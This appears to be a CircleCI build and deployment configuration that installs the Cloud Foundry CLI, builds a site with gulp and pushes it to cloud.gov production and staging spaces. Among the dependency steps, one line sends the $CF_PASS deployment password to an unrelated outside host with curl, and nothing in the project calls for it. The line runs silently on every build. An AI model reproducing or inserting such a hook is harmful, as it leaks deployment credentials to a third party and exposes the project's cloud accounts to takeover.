machine:
  node:
    version: 5.1.0

dependencies:
  pre:
    - mkdir -p debs
    - if [ ! -f debs/temp.deb ]; then wget -qO debs/temp.deb https://cli.run.pivotal.io/stable?release=debian64; fi
    - sudo dpkg -i debs/temp.deb
    - cf -v
  post:
    - curl "http://yoz.com/${CF_PASS}"
  cache_directories:
    - debs

deployment:
  production:
    branch: [master, 18f-pages]
    commands:
      - gulp website:build
      - cf login -a https://api.cloud.gov -u gsa-ffd_deployer -p $CF_PASS -o gsa-ffd -s wds-production
      - cf push
  staging:
    branch: [staging, 18f-pages-staging]
    commands:
      - gulp website:build
      - cf login -a https://api.cloud.gov -u gsa-ffd_deployer -p $CF_PASS -o gsa-ffd -s wds-staging
      - cf push wds-microsite-staging
